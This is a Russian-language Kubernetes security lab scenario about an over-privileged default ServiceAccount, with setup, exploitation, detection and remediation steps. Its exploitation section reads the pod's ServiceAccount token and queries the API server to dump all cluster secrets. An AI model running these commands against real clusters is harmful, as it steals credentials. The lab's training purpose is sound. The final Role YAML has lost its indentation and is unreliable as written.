## Сценарий 4: Секреты в Kubernetes  

# История
Этот сценарий переносит нас в мир Kubernetes и демонстрирует, как ошибки в политиках безопасности и конфигурации кластеров могут привести к компрометации секретных данных и эскалации привилегий. Легенда: приложение состоит из нескольких микросервисов, работающих в Kubernetes. Администратор заметил, что кто-то получил доступ к секрету Kubernetes (например, паролю к базе данных, хранящемуся в объекте Secret) и, возможно, использовал его для несанкционированного доступа к базе. Подозрение пало на один из подов приложения, у которого, как выяснилось, были избыточные права в кластере. Задача – расследовать, как секрет мог быть перехвачен, обнаружить ошибочные настройки (например, чрезмерные права Service Account, неправильное разделение доступа), и устранить их, не нарушив работу приложения.

# Запуск
- Убедитесь, что у вас запущен кластер (например, Minikube):
```sh
minikube start
```

- Создайте namespace:
```sh
kubectl apply -f namespace.yaml
```

- Примените секрет:
```sh
kubectl apply -f secret.yaml
```

- Разверните приложение:
```sh
kubectl apply -f deployment.yaml
```

- Примените привязку RBAC:
```sh
kubectl apply -f rolebinding.yaml
```
Теперь изнутри пода (например, с помощью kubectl exec) можно будет получить доступ ко всем секретам кластера, используя привилегированный ServiceAccount.

# Воспользоваться уязвимостью

- Получите имя pod:
```sh
POD=$(kubectl get pod -n app-namespace -o jsonpath='{.items[0].metadata.name}')
```

- Зайдите в pod:
```sh
kubectl exec -n app-namespace -it $POD -- sh
```

- Используем встроенный token для запроса в API Kubernetes и получения любых Secret:

```sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk \
    -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/secrets
```
Здесь мы видим все секреты кластера. 

- Получить конкретный:

```sh
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sSk \
    -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default.svc/api/v1/namespaces/app-namespace/secrets/db-secret \
    | jq
```

# Как обнаружить уязвимость
Способ 1: проверить привязки RBAC
```sh
kubectl get clusterrolebindings | grep default
```
Увидим:
```txt
default-sa-privileged   ClusterRole/cluster-admin   ServiceAccount/app-namespace/default
```

Способ 2: проверить права ServiceAccount
```sh
kubectl auth can-i get secrets --as=system:serviceaccount:app-namespace:default -n app-namespace
```
Если ответ yes, то ServiceAccount имеет права на чтение секретов.

# Как устранить уязвимость
- Шаг 1: Удалить опасную привязку
```sh
kubectl delete ClusterRoleBinding default-sa-privileged
```

- Шаг 2: Создать ограниченный ServiceAccount

File name: serviceaccount.yaml
```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: api-sa
  namespace: app-namespace
```
Применить:
```sh
kubectl apply -f serviceaccount.yaml
```

- Шаг 3: Обновить deployment

Измените в deployment.yaml:

```yaml
spec:
  template:
    spec:
      serviceAccountName: api-sa
```

И пересоздайте:
```sh
kubectl delete -f deployment.yaml
kubectl apply -f deployment.yaml
```

- Шаг 4 (опционально): Создать ограниченную Role, если нужен минимальный доступ к ConfigMap или log:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
namespace: app-namespace
name: api-read-config
rules:
- apiGroups: [""]
resources: ["configmaps"]
verbs: ["get", "list"]
```

# Почему появилась уязвимость?

Ошибка конфигурации: администратор дал default ServiceAccount полные права cluster-admin, не осознавая, что pod'ы автоматически используют этот аккаунт. В результате обычный pod получил привилегии администратора и доступ ко всем секретам.
